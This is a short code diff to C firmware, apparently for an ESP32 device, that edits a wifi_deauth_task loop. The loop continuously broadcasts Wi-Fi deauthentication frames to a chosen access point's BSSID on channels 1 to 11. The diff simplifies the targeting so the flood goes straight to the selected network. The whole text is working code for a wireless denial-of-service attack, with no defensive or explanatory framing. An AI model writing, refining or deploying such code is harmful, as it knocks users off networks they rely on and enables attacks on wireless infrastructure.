@@ -435,17 +435,10 @@ void wifi_deauth_task(void *param) {
     while (1) {
         if (strlen((const char*)selected_ap.ssid) > 0) // not 0 or NULL
         {
-            for (int i = 0; i < ap_count; i++)
+            for (int y = 1; y < 12; y++)
             {
-                if (selected_ap.ssid == ap_info[i].ssid)
-                {
-                    for (int y = 1; y < 12; y++)
-                    {
-                        uint8_t broadcast_mac[] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
-                        wifi_manager_broadcast_deauth(ap_info[i].bssid, y, broadcast_mac);
-                        vTaskDelay(10 / portTICK_PERIOD_MS);
-                    }
-                }
+                uint8_t broadcast_mac[] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
+                wifi_manager_broadcast_deauth(selected_ap.bssid, y, broadcast_mac);
                 vTaskDelay(10 / portTICK_PERIOD_MS);
             }
         }
